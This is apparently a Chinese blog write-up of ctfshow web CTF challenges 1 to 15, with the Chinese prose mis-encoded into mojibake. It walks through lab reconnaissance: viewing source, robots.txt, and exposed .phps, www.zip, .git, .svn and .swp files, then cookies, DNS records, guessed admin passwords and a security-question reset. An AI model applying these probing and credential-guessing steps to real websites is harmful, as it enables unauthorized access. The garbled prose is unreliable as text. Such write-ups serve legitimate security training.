class="toc-link" href="#web145"><span class="toc-number">6.49.</span> <span class="toc-text">web145</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web146"><span class="toc-number">6.50.</span> <span class="toc-text">web146</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web147"><span class="toc-number">6.51.</span> <span class="toc-text">web147</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web148"><span class="toc-number">6.52.</span> <span class="toc-text">web148</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web149"><span class="toc-number">6.53.</span> <span class="toc-text">web149</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web150"><span class="toc-number">6.54.</span> <span class="toc-text">web150</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web150-plus"><span class="toc-number">6.55.</span> <span class="toc-text">web150_plus</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-151-170"><span class="toc-number">7.</span> <span class="toc-text">Êñá‰ª∂‰∏ä‰º†(151-170)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web151"><span class="toc-number">7.1.</span> <span class="toc-text">web151</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web152"><span class="toc-number">7.2.</span> <span class="toc-text">web152</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web153"><span class="toc-number">7.3.</span> <span class="toc-text">web153</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web154"><span class="toc-number">7.4.</span> <span class="toc-text">web154</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web155"><span class="toc-number">7.5.</span> <span class="toc-text">web155</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web156"><span class="toc-number">7.6.</span> <span class="toc-text">web156</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web157"><span class="toc-number">7.7.</span> <span class="toc-text">web157</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web158"><span class="toc-number">7.8.</span> <span class="toc-text">web158</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web159"><span class="toc-number">7.9.</span> <span class="toc-text">web159</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web160"><span class="toc-number">7.10.</span> <span class="toc-text">web160</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web161"><span class="toc-number">7.11.</span> <span class="toc-text">web161</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web162"><span class="toc-number">7.12.</span> <span class="toc-text">web162</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web163"><span class="toc-number">7.13.</span> <span class="toc-text">web163</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web164"><span class="toc-number">7.14.</span> <span class="toc-text">web164</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web165"><span class="toc-number">7.15.</span> <span class="toc-text">web165</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web166"><span class="toc-number">7.16.</span> <span class="toc-text">web166</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web167"><span class="toc-number">7.17.</span> <span class="toc-text">web167</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web168"><span class="toc-number">7.18.</span> <span class="toc-text">web168</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web169"><span class="toc-number">7.19.</span> <span class="toc-text">web169</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web170"><span class="toc-number">7.20.</span> <span class="toc-text">web170</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5-171-253"><span class="toc-number">8.</span> <span class="toc-text">sqlÊ≥®ÂÖ•(171-253)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web171"><span class="toc-number">8.1.</span> <span class="toc-text">web171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web172"><span class="toc-number">8.2.</span> <span class="toc-text">web172</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web173"><span class="toc-number">8.3.</span> <span class="toc-text">web173</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web174"><span class="toc-number">8.4.</span> <span class="toc-text">web174</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web175"><span class="toc-number">8.5.</span> <span class="toc-text">web175</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web176"><span class="toc-number">8.6.</span> <span class="toc-text">web176</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web177"><span class="toc-number">8.7.</span> <span class="toc-text">web177</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web178"><span class="toc-number">8.8.</span> <span class="toc-text">web178</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web179"><span class="toc-number">8.9.</span> <span class="toc-text">web179</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web180"><span class="toc-number">8.10.</span> <span class="toc-text">web180</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web181"><span class="toc-number">8.11.</span> <span class="toc-text">web181</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web182"><span class="toc-number">8.12.</span> <span class="toc-text">web182</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web183"><span class="toc-number">8.13.</span> <span class="toc-text">web183</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web184"><span class="toc-number">8.14.</span> <span class="toc-text">web184</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web185"><span class="toc-number">8.15.</span> <span class="toc-text">web185</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web186"><span class="toc-number">8.16.</span> <span class="toc-text">web186</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web187"><span class="toc-number">8.17.</span> <span class="toc-text">web187</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web188"><span class="toc-number">8.18.</span> <span class="toc-text">web188</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web189"><span class="toc-number">8.19.</span> <span class="toc-text">web189</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web190"><span class="toc-number">8.20.</span> <span class="toc-text">web190</span></a></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image:url(https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/dAEWUr.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">dota_st</a></span><span id="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>ÊêúÁ¥¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>È¶ñÈ°µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>Êó∂Èó¥ËΩ¥</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>Ê†áÁ≠æ</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i> <span>ÁïôË®ÄÊùø</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>ÂÖ≥‰∫éÊàë</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">ctfshow-Web1000È¢òÁ≥ªÂàó‰øÆÁÇº(‰∏Ä)</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">ÂèëË°®‰∫é</span><time class="post-meta-date-created" datetime="2021-01-31T12:51:20.000Z" title="ÂèëË°®‰∫é 2021-01-31 20:51:20">2021-01-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Êõ¥Êñ∞‰∫é</span><time class="post-meta-date-updated" datetime="2021-05-01T08:42:12.380Z" title="Êõ¥Êñ∞‰∫é 2021-05-01 16:42:12">2021-05-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Â≠óÊï∞ÊÄªËÆ°:</span><span class="word-count">33.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">ÈòÖËØªÊó∂Èïø:</span><span>154ÂàÜÈíü</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">ÈòÖËØªÈáè:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="ÂâçË®Ä"><a class="header-anchor" href="#ÂâçË®Ä">¬∂</a>ÂâçË®Ä</h2><p>Ëøô‰∏™webÁ≥ªÂàóÈ¢òÊòØÂâç‰∫õÊó•Â≠êÊàëÈöèÊÑèÈÄõÈÄõÁöÑÊó∂ÂÄôÔºåÂú®ctfshowÂπ≥Âè∞‰∏äÂèëÁé∞ÁöÑÔºåÊ≠£Â•ΩwebÂ§™Ëèú‰∫ÜÔºåÂÄüÁî±Ëøô‰∏™Á≥ªÂàóÈ¢òÂºÄÂßãËá™Êàë‰øÆÁÇºÂêßüòñ</p><h2 id="‰ø°ÊÅØÊî∂ÈõÜ-1-20"><a class="header-anchor" href="#‰ø°ÊÅØÊî∂ÈõÜ-1-20">¬∂</a>‰ø°ÊÅØÊî∂ÈõÜ(1-20)</h2><h3 id="web1"><a class="header-anchor" href="#web1">¬∂</a>web1</h3><p>Âè≥ÈîÆÊü•ÁúãÊ∫êÁ†ÅÂ∞±ËÉΩÁúãÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web1/%24A%60L%5D%280Z%28L%24%5DUO3%60QC03%5B0K.png" alt=""></p><h3 id="web2"><a class="header-anchor" href="#web2">¬∂</a>web2</h3><p>ÊâìÂºÄÁΩëÈ°µÊèêÁ§∫Êó†Ê≥ïÊü•ÁúãÊ∫ê‰ª£Á†ÅÔºåÂè≥ÈîÆ‰πü‰ΩøÁî®‰∏ç‰∫ÜÔºåÈÇ£Êàë‰ª¨Â∞±Âú®urlÂâçÈù¢Âä†‰∏ä<code>view-source:</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;83a83588-671e-4a94-9c6f-6857f9e20c2f.chall.ctf.show&#x2F;</span><br></pre></td></tr></table></figure><p>ËÆøÈóÆÂêéÂç≥ÂèØËé∑Âæóflag</p><h3 id="web3"><a class="header-anchor" href="#web3">¬∂</a>web3</h3><p>Âè≥ÈîÆÊ∫êÁ†Å‰πüÊ≤°ÁúãÂà∞‰ø°ÊÅØÔºåÂéªÊü•Áúã‰∏Ä‰∏ãËØ∑Ê±ÇÂ§¥ÂíåÂìçÂ∫îÂ§¥ÔºåÂú®ÂìçÂ∫îÂ§¥ËøôÈáåÊâæÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web3/58CPJ8K6U1MK55EAIOYX6%24D.png" alt=""></p><h3 id="web4"><a class="header-anchor" href="#web4">¬∂</a>web4</h3><p>È¢òÁõÆÊèêÁ§∫robotsÔºåÊâÄ‰ª•Êàë‰ª¨Áõ¥Êé•ËÆøÈóÆ<code>http://c6f215bf-6c3e-4a21-949b-1c37d603ca56.chall.ctf.show/robots.txt</code><br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web4/%28SHD3YCKR5EX_PFSJJJ~%28KT.png" alt=""><br>ÁÑ∂ÂêéÊ†πÊçÆÊèêÁ§∫ÔºåÂÜçËÆøÈóÆflagishere.txtÔºåÂç≥ÂèØÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web4/8S25%29G2%40%25%7BLSCUTWJL%24FJJ1.png" alt=""></p><h3 id="web5"><a class="header-anchor" href="#web5">¬∂</a>web5</h3><p>È¢òÁõÆÊèêÁ§∫ÊòØphpsÊ∫êÁ†ÅÊ≥ÑÈú≤Ôºå‰∫éÊòØÂú®index.phpÂêéÈù¢Âä†‰∏äsÔºåÂç≥ÊûÑÈÄ†urlÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;69ba9522-1aaf-4726-b2df-360c5c88d1ac.chall.ctf.show&#x2F;index.phps</span><br></pre></td></tr></table></figure><p>ËÆøÈóÆÂêéÂºπÂá∫‰∏Ä‰∏™‰∏ãËΩΩÊñá‰ª∂Ôºå‰∏ãËΩΩÂêéÊâìÂºÄÊñá‰ª∂ÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web5/XL%7D%60G7X%5BG1ZPH%60HYCE__%40%7DR.png" alt=""></p><h3 id="web6"><a class="header-anchor" href="#web6">¬∂</a>web6</h3><p>È¢òÁõÆÊèêÁ§∫www.zipÊ∫êÁ†ÅÊ≥ÑÈú≤Ôºå‰∫éÊòØÊûÑÈÄ†urlËÆøÈóÆ‰∏ãËΩΩÂéãÁº©ÂåÖ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;da7afaa3-8d2b-4ae3-aa90-a0945c88ba15.chall.ctf.show&#x2F;www.zip</span><br></pre></td></tr></table></figure><p>Âú®ÂéãÁº©ÂåÖ‰∏≠Êúâ‰∏Ä‰∏™fl000g.txtÊñá‰ª∂ÔºåÊâìÂºÄÂÜÖÂÆπ‰∏∫Ôºöflag{flag_here}ÔºåÊú¨Êù•‰ª•‰∏∫ËøôÊòØflagÔºåÁÑ∂ÂêéÊèê‰∫§ÈîôËØØ‰∫Ü„ÄÇÊé•ÁùÄËÆøÈóÆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;da7afaa3-8d2b-4ae3-aa90-a0945c88ba15.chall.ctf.show&#x2F;fl000g.txt</span><br></pre></td></tr></table></figure><p>ÂæóÂà∞Ê≠£Á°ÆÁöÑflag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web6/%29%29EZQI_I6W%60%25OY7_%28GGJI%5B9.png" alt=""></p><h3 id="web7"><a class="header-anchor" href="#web7">¬∂</a>web7</h3><p>Ê†πÊçÆÊèêÁ§∫ÔºåÊòØ‰∏™gitÊ≥ÑÈú≤ÈóÆÈ¢òÔºåËÆøÈóÆ.git/index.phpÂç≥ÂèØÔºåÂç≥ÊûÑÈÄ†urlÂ¶Ç‰∏ãÔºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e85f4c26-faf9-4ace-a049-4f1b4587ad44.chall.ctf.show&#x2F;.git&#x2F;index.php</span><br></pre></td></tr></table></figure><p>ËÆøÈóÆÂêéÂ∞±ËÉΩÂæóÂà∞flag</p><h3 id="web8"><a class="header-anchor" href="#web8">¬∂</a>web8</h3><p>Ê†πÊçÆÊèêÁ§∫ÔºåÊú¨È¢òËÄÉÊü•ÁöÑÊòØsvnÊ≥ÑÈú≤</p><blockquote><p>SVNÔºàsubversionÔºâÊòØÊ∫ê‰ª£Á†ÅÁâàÊú¨ÁÆ°ÁêÜËΩØ‰ª∂„ÄÇ Âú®‰ΩøÁî®SVNÁÆ°ÁêÜÊú¨Âú∞‰ª£Á†ÅËøáÁ®ã‰∏≠Ôºå‰ºöËá™Âä®ÁîüÊàê‰∏Ä‰∏™ÈöêËóèÊñá‰ª∂Â§πÔºåÂÖ∂‰∏≠ÂåÖÂê´ÈáçË¶ÅÁöÑÊ∫ê‰ª£Á†Å‰ø°ÊÅØ„ÄÇ‰ΩÜ‰∏Ä‰∫õÁΩëÁ´ôÁÆ°ÁêÜÂëòÂú®ÂèëÂ∏É‰ª£Á†ÅÊó∂Ôºå‰∏çÊÑøÊÑè‰ΩøÁî®‚ÄòÂØºÂá∫‚ÄôÂäüËÉΩÔºåËÄåÊòØÁõ¥Êé•Â§çÂà∂‰ª£Á†ÅÊñá‰ª∂Â§πÂà∞WEBÊúçÂä°Âô®‰∏äÔºåËøôÂ∞±‰ΩøÈöêËóèÊñá‰ª∂Â§πË¢´Êö¥Èú≤‰∫éÂ§ñÁΩëÁéØÂ¢ÉÔºåËøô‰ΩøÂæóÊ∏óÈÄèÂ∑•Á®ãÂ∏àÂèØ‰ª•ÂÄüÂä©ÂÖ∂‰∏≠ÂåÖÂê´ÁâàÊú¨‰ø°ÊÅØËøΩË∏™ÁöÑÁΩëÁ´ôÊñá‰ª∂ÔºåÈÄêÊ≠•Êë∏Ê∏ÖÁ´ôÁÇπÁªìÊûÑ„ÄÇ Âú®ÊúçÂä°Âô®‰∏äÂ∏ÉÁΩ≤‰ª£Á†ÅÊó∂„ÄÇÂ¶ÇÊûúÊòØ‰ΩøÁî® svn checkout ÂäüËÉΩÊù•Êõ¥Êñ∞‰ª£Á†ÅÔºåËÄåÊ≤°ÊúâÈÖçÁΩÆÂ•ΩÁõÆÂΩïËÆøÈóÆÊùÉÈôêÔºåÂàô‰ºöÂ≠òÂú®Ê≠§ÊºèÊ¥û„ÄÇÈªëÂÆ¢Âà©Áî®Ê≠§ÊºèÊ¥ûÔºåÂèØ‰ª•‰∏ãËΩΩÊï¥Â•óÁΩëÁ´ôÁöÑÊ∫ê‰ª£Á†Å„ÄÇ</p></blockquote><p>Êàë‰ª¨ÊûÑÈÄ†urlËÆøÈóÆÔºåÂç≥ÂèØËé∑Âæóflag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a79a4695-f024-44dd-af3e-4eb6c2720be7.chall.ctf.show&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure><h3 id="web9"><a class="header-anchor" href="#web9">¬∂</a>web9</h3><p>Êú¨È¢òËÄÉÊü•ÁöÑÊòØvimÁöÑÁºìÂ≠òÊ≥ÑÈú≤</p><blockquote><p>vimÁºñËæëÊñáÊú¨Êó∂‰ºöÂàõÂª∫‰∏Ä‰∏™‰∏¥Êó∂Êñá‰ª∂ÔºåÂ¶ÇÊûúÁ®ãÂ∫èÊ≠£Â∏∏ÈÄÄÂá∫Ôºå‰∏¥Êó∂Êñá‰ª∂Ëá™Âä®Âà†Èô§ÔºåÂ¶ÇÊûúÊÑèÂ§ñÈÄÄÂá∫Â∞±‰ºö‰øùÁïôÔºåÂΩìvimÂºÇÂ∏∏ÈÄÄÂá∫ÂêéÔºåÂõ†‰∏∫Êú™Â§ÑÁêÜÁºìÂ≠òÊñá‰ª∂ÔºåÂØºËá¥ÂèØ‰ª•ÈÄöËøáÁºìÂ≠òÊñá‰ª∂ÊÅ¢Â§çÂéüÂßãÊñá‰ª∂ÂÜÖÂÆπ„ÄÇËÄåÊú¨È¢òÁöÑÊÉÖÊôØÂ∞±ÊòØÁîµËÑëÊ≠ªÊú∫‰∫ÜÊÑèÂ§ñÈÄÄÂá∫ÔºåÂØºËá¥Â≠òÂú®‰∏¥Êó∂Êñá‰ª∂</p></blockquote><p>ÊûÑÈÄ†urlÂ¶Ç‰∏ãÔºå‰∏ãËΩΩ.swpÂêéÁºÄÁªìÂ∞æÁöÑÊñá‰ª∂</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0b4ba9f5-92a1-42fa-ba28-49cff3f8400e.chall.ctf.show&#x2F;index.php.swp</span><br></pre></td></tr></table></figure><p>ÊâìÂºÄÊñá‰ª∂Âç≥ÂèØËé∑Âèñflag</p><h3 id="web10"><a class="header-anchor" href="#web10">¬∂</a>web10</h3><p>È¢òÁõÆÊèêÁ§∫cookieÔºåÁÑ∂ÂêéÊàë‰ª¨Êü•Áúã‰∏Ä‰∏ãËØ∑Ê±ÇÂ§¥ÔºåÂèëÁé∞cookieÊï∞ÊçÆ‰∏∫flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web10/5%5BL%7B~%7BV%24%245%254B7%5D67~%29B5CX.png" alt=""><br>Êàë‰ª¨Ëß£‰∏Ä‰∏ãurlÁºñÁ†ÅÔºåÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web10/%5DCN%2579K%24A9%280%24%60%240_TOFG%28E.png" alt=""></p><h3 id="web11"><a class="header-anchor" href="#web11">¬∂</a>web11</h3><p>Ê†πÊçÆÊèêÁ§∫ÔºåÊü•ËØ¢ÂØπctfshowÂüüÂêçËøõË°ådnsÊü•ËØ¢ÔºåÊü•ÁúãTXTËÆ∞ÂΩï<br>ÈòøÈáå‰∫ëÊü•ËØ¢ÈìæÊé•Ôºö<a target="_blank" rel="noopener external nofollow noreferrer" href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a><br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web11/RDP905P_SOZF0HM725N3%7DJV.png" alt=""><br>Ëé∑ÂèñflagÊàêÂäü</p><h3 id="web12"><a class="header-anchor" href="#web12">¬∂</a>web12</h3><p>Ê†πÊçÆÈ¢òÁõÆÊèêÁ§∫ÔºåÊàë‰ª¨ËÆøÈóÆrobots.txtÔºåËé∑ÂèñÂà∞ÂêéÂè∞Âú∞ÂùÄ<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web12/%24%24%28H%2954_BF%5DPS%7B06RN_M%7B7O.png" alt=""><br>ÁÑ∂ÂêéÊàë‰ª¨ËÆøÈóÆ‰∏Ä‰∏ãÂêéÂè∞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;c25a456d-63f7-497e-9170-0365a9cdce53.chall.ctf.show&#x2F;admin&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web12/3UKIBC9YJVM%40%7D6V%29O%28LT%291G.png" alt=""><br>Ë¥¶Âè∑ÂêçÁõ¥Êé•Áõ≤ÁåúadminÔºåÂØÜÁ†ÅÊòØÁΩëÁ´ôÂ∫ïÈÉ®ÁöÑËøô‰∏≤Êï∞Â≠óÔºå372619038<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web12/ZIA0BV2O2KFNIR~5%24%282T2DN.png" alt=""><br>ÁôªÂΩïËøõÊù•ÂêéÔºåËé∑ÂèñÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web12/OD2%603%24A%4083R%5BL%287A%5DGC%24Z%5B2.png" alt=""></p><h3 id="web13"><a class="header-anchor" href="#web13">¬∂</a>web13</h3><p>Âú®ÁΩëÁ´ôÊâæÂà∞‰∏Ä‰∏™Ë∂ÖÈìæÊé•<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web13/JDUYP_%7D%24%24HV%5B%7BUGOENSK%7BLB.png" alt=""><br>ËÆøÈóÆÂêéÔºåÂèëÁé∞ÂºÄÂèëËÄÖÂú®ÊñáÊ°£‰∏≠ÂÜô‰∫ÜËá™Â∑±ÁöÑÂêéÂè∞Âú∞ÂùÄÂíåË¥¶Âè∑ÂØÜÁ†Å<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web13/Q%25%25%40CO8%29ZM%40M1%29_%7BMLDU6P6.png" alt=""><br>ËøôÈáåÊääyour-domainÊç¢ÊàêËá™Â∑±ÁöÑÂÅöÈ¢òÁéØÂ¢ÉÔºåËÆøÈóÆÂêéÂè∞Âú∞ÂùÄ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e63907cd-33af-4c57-b605-4f7e04928e43.chall.ctf.show&#x2F;system1103&#x2F;login.php</span><br></pre></td></tr></table></figure><p>ËæìÂÖ•Ë¥¶Âè∑ÂíåÂØÜÁ†ÅÂêéÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web13/1G7F~2%7D~NO048WQL%5D1LFUTR.png" alt=""></p><h3 id="web14"><a class="header-anchor" href="#web14">¬∂</a>web14</h3><p>ÊâìÂºÄÁΩëÁ´ôÔºåÊ†πÊçÆÊèêÁ§∫ËÆøÈóÆ<code>http://4696e930-9cb3-47fd-a00b-c671f82fe4a4.chall.ctf.show/editor/</code><br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web14/Y%5B8CN%60PAKNL%7BV%25SICU%60LH56.png" alt=""><br>ÁúãÂà∞‰∏Ä‰∏™ÁºñËæëÂô®ÔºåÂú®flashÁöÑ‰∏ä‰º†‰∏≠ÔºåÂèëÁé∞Êúâ‰∏™Êñá‰ª∂Á©∫Èó¥<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web14/617KH%5BRRFKY%5D4L%5BI%5DW~UXA3.png" alt=""><br>ÁÇπÂáªÊñá‰ª∂Á©∫Èó¥ÔºåÂèëÁé∞ÁàÜÂá∫‰∫ÜÁõÆÂΩï<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web14/%25U17ETN4D42GP3~TG%7D%25N3M8.png" alt=""><br>Êâæ‰∫ÜÊâæÔºåflagÂú®var/www/html/nothinghere/fl000g.txt‰∏≠Ôºå‰∫éÊòØÊûÑÈÄ†urlËÆøÈóÆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4696e930-9cb3-47fd-a00b-c671f82fe4a4.chall.ctf.show&#x2F;nothinghere&#x2F;fl000g.txt</span><br></pre></td></tr></table></figure><p>ÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web14/%60_%28G6DSOG5TBQLZLDH08F7V.png" alt=""></p><h3 id="web15"><a class="header-anchor" href="#web15">¬∂</a>web15</h3><p>Ê†πÊçÆÈ¢òÁõÆÊèêÁ§∫ÈÇÆÁÆ±ÔºåÂú®ÁΩëÈ°µÂ∫ïÈÉ®ÂèëÁé∞‰∏Ä‰∏™ÈÇÆÁÆ±<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web15/HK_MLVPS3%246282SAV6YPFIM.png" alt=""><br>ÂÜçurlÂêéÈù¢Âä†‰∏äadminËÆøÈóÆ‰∏Ä‰∏ãÂêéÂè∞<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web15/VFRR%5DS8%60%60%7DV7%5D%251%25_2QAGS7.png" alt=""><br>Êúâ‰∏Ä‰∏™ÂøòËÆ∞ÂØÜÁ†ÅÈÄâÈ°πÔºåÁÇπÂáª‰∏Ä‰∏ã<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web15/%24OSUPYKMZZOORSX80VE63S2.png" alt=""><br>ÊúâÂØÜ‰øùÈóÆÈ¢òÔºåËÅîÊÉ≥Âà∞qqÈÇÆÁÆ±ÔºåÊêúÁ¥¢‰∏Ä‰∏ãqq<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web15/8%24BYJYK%5B7%251M3N0TF%60F%60VK2.png" alt=""><br>ÂæóÂà∞Âú∞ÂùÄ‰∏∫Ë•øÂÆâÔºå‰∫éÊòØÊèê‰∫§Ë•øÂÆâ<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/web15/I%5D%5B9%7BXDD98TS%5BMO%5DB%28_%7B%29%60P.png" alt=""><br>ÂæóÂà∞ÂØÜÁ†Å‰∏∫admin7789ÔºåË¥¶Âè∑ËøòÊòØadminÔºåÁôªÂΩïÂêéËé∑Âæóflag</p><h3 id="web16"><a class="header-anchor" 